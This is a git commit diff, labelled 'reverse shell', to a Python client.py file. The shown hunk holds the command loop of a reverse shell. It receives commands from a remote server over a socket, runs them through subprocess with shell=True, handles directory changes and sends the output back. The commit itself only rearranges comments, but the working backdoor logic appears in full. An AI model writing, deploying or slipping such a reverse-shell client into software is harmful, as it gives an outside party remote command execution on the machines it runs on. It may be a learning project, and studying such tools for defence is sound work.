2cfe2bc0ca3a09a854c9b542519d797b63769eb7
prodseanb <seanbachiller03@gmail.com>
2021-05-22 23:50:38 -0400

    reverse shell

--- client.py
+++ client.py
@@ -15,22 +15,24 @@ print('[*] Server: ', data)
 #loop used as a shell
 while True:
 	cmd = client.recv(1024).decode() #receive the command
-	print(f'[*] Receive: {cmd}')
+	#print(f'[*] Receive: {cmd}')
 
-	if cmd[:2] == 'cd':
-		os.chdir(cmd[3:])
+	if cmd[:2] == 'cd': 
+		os.chdir(cmd[3:]) #change directory command using os.chdir
 
+	#allow user to quit, 
 	quit = ['q', 'quit', 'x', 'exit']
-	#allow user to quit
 	if cmd.lower() in quit:
 		break
 	try:
-		result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) #run the command
+		#run the command
+		result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) 
 	except Exception as e:
 		result = str(e).encode()
 
 	#Send reassurance to the server that connection is still active if command has no output
 	if len(result) == 0:
+		#print 'No output when command does not output anything.'
 		result = 'No output.'.encode()
     #Send the output to the server
 	client.send(result)
